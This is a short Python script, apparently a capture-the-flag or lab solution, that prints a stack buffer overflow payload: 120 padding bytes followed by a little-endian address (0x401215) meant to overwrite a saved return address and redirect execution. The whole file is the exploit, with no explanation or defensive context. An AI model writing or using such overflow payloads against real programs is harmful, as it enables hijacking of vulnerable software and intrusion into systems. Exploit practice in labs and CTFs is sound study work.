import sys

sheld = b"A" * (112+8)

value = b"\x15\x12\x40\x00\x00\x00\x00\x00"

sys.stdout.buffer.write(sheld+value)




